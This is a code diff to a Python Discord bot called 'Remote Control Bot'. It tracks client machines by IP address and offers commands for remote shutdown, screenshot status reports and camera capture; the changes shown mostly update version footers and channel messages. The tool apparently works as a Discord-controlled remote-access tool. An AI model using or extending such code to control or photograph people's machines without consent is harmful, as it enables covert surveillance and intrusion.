@@ -149,18 +149,18 @@ async def on_ready():
                     category = nextcord.utils.get(guild.categories, name=str(ip))
                     channel5 = nextcord.utils.get(category.text_channels, name="events")
                     await channel5.send(f"Client updated to version v{tex}")
-                    await channel13.send(f"Client {ip} updated to version v{tex}")
+                    await channel13.send(f"Client {ip} updated to version v{tex}, use commands in: {nextcord.utils.get(category.text_channels, name="commands").mention}")
                     with open(os.path.join(target_path, "skibidi-mainmain", "update.txt"), "w") as up:
                         up.write("")
                         up.close()
                     with open(os.path.join(target_path, "skibidi-mainmain", "ver.txt"), "w") as up2:
                         up2.write(tex)
                         up2.close()
-            await channel12.send(f"Client {ip} online!")
+            await channel12.send(f"Client {ip} online, use commands in: {nextcord.utils.get(category.text_channels, name="commands").mention}")
             category = nextcord.utils.get(guild.categories, name=str(ip))
             if category:
                 embed = nextcord.Embed(title="Client online!", timestamp=datetime.now(), colour=0x00f51d)
-                embed.set_footer(text="fateer's thingy")
+                embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
                 channel = nextcord.utils.get(category.text_channels, name="events")
                 if channel:
                     await channel.send(embed=embed)
@@ -171,6 +171,9 @@ async def on_ready():
 
 ip = get_device_ip()
 testServerId = [1139988299386195981]
+with open(os.path.join(target_path, "skibidi-mainmain", "update.txt")) as ver9:
+    ver8 = ver9.read()
+    ver9.close()
 
 
 
@@ -191,7 +194,7 @@ async def shutdown(interaction : Interaction):
         embed = nextcord.Embed(description="Status before shutdown", title="Status:", timestamp=datetime.now(), colour=0xb400f5)
         embed.set_author(name="Remote Control Bot")
         embed.set_image(url=f"attachment://status.png")
-        embed.set_footer(text="Remote Control Bot v1.3")
+        embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
 
         await interaction.send(embed=embed, file=file)
         os.system("shutdown /s /t 1")
@@ -213,7 +216,7 @@ async def shutdown_all(interaction : Interaction):
     embed = nextcord.Embed(description="Status before shutdown", title="Status:", timestamp=datetime.now(), colour=0xb400f5)
     embed.set_author(name="Remote Control Bot")
     embed.set_image(url=f"attachment://status.png")
-    embed.set_footer(text="Remote Control Bot v1.3")
+    embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
 
     await interaction.send(embed=embed, file=file)
     os.system("shutdown /s /t 1")
@@ -236,7 +239,7 @@ async def status(interaction : Interaction):
         embed = nextcord.Embed(description="Status", title="Status:", timestamp=datetime.now(), colour=0xb400f5)
         embed.set_author(name="Remote Control Bot")
         embed.set_image(url=f"attachment://status.png")
-        embed.set_footer(text="Remote Control Bot v1.3")
+        embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
 
         await interaction.send(embed=embed, file=file)
 
@@ -263,7 +266,7 @@ async def take_picture(interaction : Interaction):
                 embed = nextcord.Embed(description="Image", title="Captured image:", timestamp=datetime.now(), colour=0xb400f5)
                 embed.set_author(name="Remote Control Bot")
                 embed.set_image(url=f"attachment://captured_image.png")
-                embed.set_footer(text="Remote Control Bot v1.3")
+                embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
 
                 await interaction.send(embed=embed, file=file)
                 await interaction.delete_original_message()
